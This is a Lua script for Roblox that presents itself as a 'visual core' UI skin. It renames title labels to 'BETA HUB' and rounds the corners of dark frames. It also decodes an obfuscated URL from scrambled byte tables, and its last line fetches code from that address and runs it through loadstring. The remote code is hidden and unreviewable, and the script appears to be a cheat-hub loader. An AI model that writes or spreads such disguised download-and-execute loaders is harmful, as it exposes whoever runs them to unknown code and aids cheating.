
--[[ STAGE 2: VISUAL CORE ]]
local mwJ0sp0ue0G8c05xHcE = bit32 and bit32.bxor
if not mwJ0sp0ue0G8c05xHcE then
    mwJ0sp0ue0G8c05xHcE = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function OaF_23q7JbDbIC(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = mwJ0sp0ue0G8c05xHcE(v, a)
        else
            v = mwJ0sp0ue0G8c05xHcE(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local npT3tz6YrozeWIQAq = {
  {{123, 70, 59, 64, 81}, 126, 40, 0, 2, true, 9},
  {{90, 112, 124, 129, 114, 114}, 199, 196, 0, 2, false, 18},
  {{115, 139, 99, 115, 89, 188, 126}, 78, 73, 0, 3, true, 14},
  {{111, 112, 115, 106, 120, 114, 124}, 163, 160, 0, 2, false, 8},
  {{126, 45, 50, 57, 144}, 109, 26, 0, 5, false, 20},
  {{137, 149, 255}, 61, 56, 1, 7, true, 4},
  {{174, 164, 194}, 130, 187, 1, 5, true, 15},
  {{200, 254, 250, 206}, 145, 249, 1, 1, true, 17},
  {{209, 152, 235}, 208, 206, 1, 4, false, 2},
  {{55, 60, 46, 52}, 221, 114, 1, 5, false, 5},
  {{21, 101, 106, 104}, 175, 84, 1, 1, true, 6},
  {{133, 115, 63, 67, 74, 77, 84}, 90, 13, 0, 3, true, 1},
  {{205, 223, 211}, 203, 163, 1, 1, true, 10},
  {{145, 153, 148, 159, 146, 166}, 135, 154, 0, 4, true, 12},
  {{142, 145, 139, 140, 84, 154}, 39, 64, 1, 1, true, 3},
  {{117, 74, 189, 76, 107, 132, 129}, 222, 199, 0, 1, false, 16},
  {{81, 97, 78, 16}, 143, 95, 0, 4, true, 21},
  {{14, 9, 76, 54, 11, 10, 73}, 110, 241, 1, 1, false, 7},
  {{206, 12, 200, 206, 208}, 103, 48, 1, 6, false, 13},
  {{20, 22, 10}, 59, 176, 1, 7, true, 11},
  {{25, 97, 116, 38}, 76, 240, 1, 6, false, 19}
}
local ywC2milaKpy6JUeKn_6w2ac = {}
for uRwxs7GESr5PnEAg = 1, #npT3tz6YrozeWIQAq do
    local WxpIShyYKXOnkQ12I = npT3tz6YrozeWIQAq[uRwxs7GESr5PnEAg]
    ywC2milaKpy6JUeKn_6w2ac[WxpIShyYKXOnkQ12I[7]] = OaF_23q7JbDbIC(WxpIShyYKXOnkQ12I[1], WxpIShyYKXOnkQ12I[2], WxpIShyYKXOnkQ12I[3], WxpIShyYKXOnkQ12I[4], WxpIShyYKXOnkQ12I[5], WxpIShyYKXOnkQ12I[6])
end
local PfQijvrHg4qQmzhFaSa = table.concat(ywC2milaKpy6JUeKn_6w2ac)
local HubName = "BETA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(PfQijvrHg4qQmzhFaSa))()
